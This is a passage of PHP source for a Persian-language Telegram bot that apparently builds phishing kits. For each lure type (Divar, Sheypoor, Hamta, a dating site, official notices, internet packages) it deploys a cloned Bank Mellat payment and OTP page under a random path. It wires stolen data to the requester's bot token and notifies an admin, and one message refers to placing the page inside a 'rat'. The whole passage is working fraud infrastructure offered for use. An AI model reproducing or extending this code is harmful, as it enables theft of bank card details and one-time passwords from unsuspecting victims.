    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"dostyabi"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
    elseif($query == "dostyabi_img"){
        bot('sendPhoto',[
            'chat_id'=>$query_id,
            'photo'=>"https://t.me/pishingbax_files/30",
            'caption'=>"نمونه درگاه دوستیابی ✅",
            'reply_markup'=>false,
            'message_id' =>$query_messageid
         ]);
    }
    ##------------------------------##

    ##------------------------------##
         elseif($query == "divar"){
                    file_put_contents("data/$query_id/step.txt","make_bsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"divar_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="make_bsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه دیوار ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/divar");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/divar/index.html","data/$chat_id/payment/$rand/divar/index.html");



      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "دیوار" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/divar",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "دیوار" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/divar", 'code' => "$rand",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه دیوار شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/divar/index.html
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/divar/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"divar"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
        elseif($query == "divar_img"){
            bot('sendPhoto',[
                'chat_id'=>$query_id,
                'photo'=>"https://t.me/pishingbax_files/22",
                'caption'=>"نمونه درگاه دیوار ✅",
                'reply_markup'=>false,
                'message_id' =>$query_messageid
            ]);
        }
    ##-------------------------##
    
         elseif($query == "sheypoor2"){
                    file_put_contents("data/$query_id/step.txt","11make_bsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"sheypoor2_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="11make_bsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه شیپور ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/sheypoor2");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/sheypoor2/index.html","data/$chat_id/payment/$rand/sheypoor2/index.html");



      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "شیپور" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/sheypoor2",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "شیپور" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/sheypoor2", 'code' => "$rand",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه شیپور شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/sheypoor2/index.html
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/sheypoor2/index.html
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"sheypoor2"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
        elseif($query == "sheypoor2_img"){
            bot('sendPhoto',[
                'chat_id'=>$query_id,
                'photo'=>"https://t.me/pishingbax_files/39",
                'caption'=>"نمونه درگاه شیپور ✅",
                'reply_markup'=>false,
                'message_id' =>$query_messageid
            ]);
        }
    ##-------------------------##
    
         elseif($query == "hamta"){
                    file_put_contents("data/$query_id/step.txt","mmmake_bsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"hamta_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="mmmake_bsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه همتا ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/hamta");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/hamta/index.php","data/$chat_id/payment/$rand/hamta/index.php");
copy("source/hamta/send.php","data/$chat_id/payment/$rand/hamta/send.php");


      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "همتا" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/hamta",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "همتا" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/hamta", 'code' => "$rand",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه همتا شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/hamta/index.php
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/hamta/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"hamta"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
    elseif($query == "hamta_img"){
            bot('sendPhoto',[
                'chat_id'=>$query_id,
                'photo'=>"https://t.me/pishingbax_files/16",
                'caption'=>"نمونه درگاه همتا ✅",
                'reply_markup'=>false,
                'message_id' =>$query_messageid
            ]);
        }
    ##-------------------------##
    
        elseif($query == "sheypoor"){
                    file_put_contents("data/$query_id/step.txt","vmake_mbsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"sh_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="vmake_mbsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه شیپور ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/sheypoor");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");
 
copy("source/sheypoor/index.php","data/$chat_id/payment/$rand/sheypoor/index.php");


      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "شیپور" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/sheypoor",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "شیپور" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/sheypoor", 'code' => "$rand",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه شیپور شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/sheypoor/index.php
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/sheypoor/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"sheypoor"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
       elseif($query == "sh_img"){
            bot('sendPhoto',[
                'chat_id'=>$query_id,
                'photo'=>"https://t.me/pishingbax_files/26",
                'caption'=>"نمونه درگاه شیپور ✅",
                'reply_markup'=>false,
                'message_id' =>$query_messageid
             ]);
        }
    ##-------------------------##
         elseif($query == "eblagh3"){
                    file_put_contents("data/$query_id/step.txt","make_mbsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"eblagh3_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="make_mbsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه ابلاغ 3 ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/eblagh3");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/eblagh3/index.html","data/$chat_id/payment/$rand/eblagh3/index.html");

copy("source/eblagh3/send.php","data/$chat_id/payment/$rand/eblagh3/send.php");

      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "ابلاغیه" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/eblagh3",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "ابلاغیه" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/eblagh3", 'code' => "$rand",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه ابلاغیه شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/eblagh3/index.html
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/eblagh3/index.php
      ➖➖➖➖➖
            [🔅] نکته : این درگاه کامل داخل رت قرار میگیرد
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"eblagh3"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
    elseif($query == "eblagh3_img"){
        bot('sendPhoto',[
            'chat_id'=>$query_id,
            'photo'=>"https://t.me/pishingbax_files/11",
            'caption'=>"نمونه درگاه ابلاغ ✅",
            'reply_markup'=>false,
            'message_id' =>$query_messageid
         ]);
    }
##------------------------------------##

    ##-----------------------#3
       elseif($query == "net1"){
                    file_put_contents("data/$query_id/step.txt","zmmazz11make_bsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"net1_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="zmmazz11make_bsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه اینترنت ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/net1");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/net1/index.php","data/$chat_id/payment/$rand/net1/index.php");



      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "اینترنت" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/net1",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "اینترنت" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/net1", 'code' => "$rand",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه اینترنت شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/net1/index.php
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/net1/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
